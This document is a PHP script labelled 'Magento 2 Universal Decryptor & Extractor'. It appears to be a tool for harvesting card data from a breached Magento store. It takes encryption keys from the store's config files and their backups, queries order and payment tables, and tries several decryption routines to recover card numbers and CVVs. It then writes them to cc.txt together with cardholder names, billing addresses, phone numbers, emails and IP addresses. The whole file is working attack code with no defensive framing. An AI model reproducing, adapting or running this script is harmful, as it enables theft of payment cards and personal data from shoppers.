<?php
/**
 * Magento 2 Universal Decryptor & Extractor
 * D1337 SOVEREIGN LABS
 */

error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('memory_limit', '512M');

echo "Starting Universal Decrypt Script...\n";

// ============================================
// 1. BOOTSTRAP & SETUP
// ============================================
function findMagentoRoot() {
    $roots = [
        dirname(__FILE__) . '/../../../../../../../',
        dirname(__FILE__) . '/../../../../../../',
        dirname(__FILE__) . '/../../../../../',
        dirname(__FILE__) . '/../../../../',
        dirname(__FILE__) . '/../../../',
        dirname(__FILE__) . '/../../',
        dirname(__FILE__) . '/../',
        dirname(__FILE__),
        getcwd()
    ];
    foreach ($roots as $root) {
        $root = realpath($root);
        if ($root && file_exists($root . '/app/bootstrap.php')) return $root;
    }
    return null;
}

$magento_root = findMagentoRoot();
if (!$magento_root) die("Error: Magento root not found.\n");

echo "Magento Root: $magento_root\n";
require $magento_root . '/app/bootstrap.php';

use Magento\Framework\App\Bootstrap;
use Magento\Framework\Encryption\Encryptor;
use Magento\Framework\Encryption\Key;

try {
    $bootstrap = Bootstrap::create($magento_root, $_SERVER);
    $om = $bootstrap->getObjectManager();
    $resource = $om->get(\Magento\Framework\App\ResourceConnection::class);
    $db = $resource->getConnection();
    
    $tblSalesOrder = $resource->getTableName('sales_order');
    $tblSalesOrderPayment = $resource->getTableName('sales_order_payment');
    $tblSalesOrderAddress = $resource->getTableName('sales_order_address');
    
} catch (\Exception $e) {
    die("Bootstrap Error: " . $e->getMessage() . "\n");
}

// ============================================
// 2. KEY HARVESTING
// ============================================
$keys = [];
// 1. Current
$envPath = $magento_root . '/app/etc/env.php';
if (file_exists($envPath)) {
    $env = include $envPath;
    if (isset($env['crypt']['key'])) $keys[] = $env['crypt']['key'];
}
// 2. Backups
foreach (glob($magento_root . '/app/etc/env*.php*') as $f) {
    if ($f == $envPath) continue;
    $c = file_get_contents($f);
    if (preg_match("/'key'\s*=>\s*'([^']+)'/", $c, $m)) $keys[] = $m[1];
}
// 3. M1 Legacy
$m1 = $magento_root . '/app/etc/local.xml';
if (file_exists($m1)) {
    $x = @simplexml_load_file($m1);
    if ($x && isset($x->global->crypt->key)) $keys[] = (string)$x->global->crypt->key;
}
$keys = array_unique($keys);
echo "Loaded " . count($keys) . " keys.\n";

// ============================================
// 3. DECRYPTION UTILS
// ============================================

function try_sodium_manual($encrypted_full, $key) {
    if (!extension_loaded('sodium')) {
        return false;
    }
    
    // Format: 0:3:BASE64_PAYLOAD or similar
    // The encrypted string usually looks like "0:3:..." where 3 is the version.
    $parts = explode(':', $encrypted_full);
    
    // If we have at least 3 parts, the last one is the payload
    if (count($parts) < 3) return false;
    
    $payload = base64_decode(end($parts));
    if (!$payload) return false;

    // Sodium needs nonce (24 bytes) + ciphertext
    if (strlen($payload) < SODIUM_CRYPTO_SECRETBOX_NONCEBYTES) return false;

    $nonce = substr($payload, 0, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
    $msg = substr($payload, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
    
    // VARIATIONS OF KEY TO TRY
    $keys_to_try = [];
    
    // 1. Raw string key
    $keys_to_try['raw'] = $key;
    
    // 2. MD5 of key (32 chars) - common in some M2 contexts
    $keys_to_try['md5'] = md5($key); 
    
    // 3. Hex decoding? If key is 64 hex chars
    if (strlen($key) === 64 && ctype_xdigit($key)) {
        $keys_to_try['hex2bin'] = hex2bin($key);
    }
    
    // 4. Substring (32)
    $keys_to_try['substr_32'] = substr($key, 0, 32);

    foreach ($keys_to_try as $type => $k) {
        if (strlen($k) !== SODIUM_CRYPTO_SECRETBOX_KEYBYTES) continue;
        
        try {
            $pt = sodium_crypto_secretbox_open($msg, $nonce, $k);
            if ($pt !== false) return $pt;
        } catch (\Exception $e) {}
    }
    
    return false;
}


function try_m1_mcrypt($value, $key) {
    if (!function_exists('mcrypt_decrypt')) return false;
    // M1 uses Rijndael-256 (not AES)
    $pt = @mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $value, MCRYPT_MODE_ECB);
    return rtrim($pt, "\0");
}

function smart_decrypt($om, $value, $keys) {
    if (!$value) return '';
    
    // 1. Try Default Magento Encryptor (Best bet for M2)
    try {
        $enc = $om->get(Encryptor::class);
        $pt = $enc->decrypt($value);
        if ($pt && preg_match('/^\d{13,19}$/', $pt)) return $pt;
    } catch (\Exception $e) {}

    // 2. Try Manual Sodium/Mcrypt with ALL keys
    foreach ($keys as $k) {
        // Sodium (M2) - Version 3
        if (strpos($value, ':3:') !== false) {
             $pt = try_sodium_manual($value, $k);
             if ($pt && preg_match('/^\d{13,19}$/', $pt)) return $pt;
        }
        
        // Mcrypt (M1 Legacy or M2 old)
        if (strpos($value, ':') === false) {
            // Raw string -> likely M1
            $pt = try_m1_mcrypt($value, $k);
            if ($pt && preg_match('/^\d{13,19}$/', $pt)) return $pt;
        }
        
        // Attempt using Encryptor with injected key
        try {
            if (class_exists(Key::class)) {
                $customEnc = new Encryptor(new Key($k));
                $pt = $customEnc->decrypt($value);
                if ($pt && preg_match('/^\d{13,19}$/', $pt)) return $pt;
            }
        } catch (\Exception $e) {}
    }
    
    // Fallback
    return $value;
}


function choose_pan($jsonPan, $columnPan) {
    if ($jsonPan !== null && $jsonPan !== '') return $jsonPan;
    if ($columnPan !== null && $columnPan !== '') return $columnPan;
    return '';
}

// ============================================
// 4. MAIN LOOP & EXTRACTION
// ============================================

// Query for potential CC data
$sql = "
SELECT
    so.increment_id AS order_number,
    so.created_at   AS order_date,
    sop.method      AS payment_method,

    sop.cc_number_enc AS col_cc_number_enc,
    JSON_UNQUOTE(JSON_EXTRACT(sop.additional_information,'$.cc_number_enc')) AS json_cc_number_enc,
    JSON_UNQUOTE(JSON_EXTRACT(sop.additional_information,'$.cc_cid_enc'))    AS json_cc_cid_enc,

    sop.cc_exp_month,
    sop.cc_exp_year,

    ba.firstname,
    ba.lastname,
    ba.street,
    ba.city,
    ba.region   AS state,
    ba.postcode AS zip,
    ba.country_id AS country,
    ba.telephone AS phone,
    so.customer_email,
    so.remote_ip

FROM {$tblSalesOrderPayment} sop
JOIN {$tblSalesOrder} so ON so.entity_id = sop.parent_id
LEFT JOIN {$tblSalesOrderAddress} ba ON ba.parent_id = so.entity_id AND ba.address_type = 'billing'

WHERE
    (sop.cc_number_enc IS NOT NULL AND sop.cc_number_enc != '')
    OR (sop.additional_information LIKE '%cc_number_enc%')

ORDER BY so.created_at DESC
LIMIT 2000
";

echo "Executing extraction query...\n";

try {
    $rows = $db->fetchAll($sql);
    echo "Found " . count($rows) . " rows.\n";
} catch (\Exception $e) {
    die("DB Error: " . $e->getMessage() . "\n");
}

$outFile = __DIR__ . '/cc.txt';
$fh = fopen($outFile, 'w');
$countDecrypted = 0;

foreach ($rows as $r) {
    $encPan = choose_pan($r['json_cc_number_enc'], $r['col_cc_number_enc']);
    
    // Decrypt
    $pan = smart_decrypt($om, $encPan, $keys);
    $cvv = smart_decrypt($om, $r['json_cc_cid_enc'], $keys);

    if (preg_match('/^[0-9]{13,19}$/', $pan)) {
        $countDecrypted++;
    }

    $line =
        "ORDER={$r['order_number']} | " .
        "DATE={$r['order_date']} | " .
        "METHOD={$r['payment_method']} | " .
        "PAN={$pan} | " .
        "CVV={$cvv} | " .
        "EXP={$r['cc_exp_month']}/{$r['cc_exp_year']} | " .
        "NAME={$r['firstname']} {$r['lastname']} | " .
        "ADDRESS=" . str_replace(["\n", "\r"], ' ', (string)$r['street']) . " | " .
        "CITY={$r['city']} | " .
        "STATE={$r['state']} | " .
        "ZIP={$r['zip']} | " .
        "COUNTRY={$r['country']} | " .
        "PHONE={$r['phone']} | " .
        "EMAIL={$r['customer_email']} | " .
        "IP={$r['remote_ip']}";

    fwrite($fh, $line . PHP_EOL);
}

fclose($fh);

echo "DONE. Written to {$outFile}\n";
echo "Stats: Extracted " . count($rows) . " rows. Successfully decrypted {$countDecrypted} PANs.\n";
?>
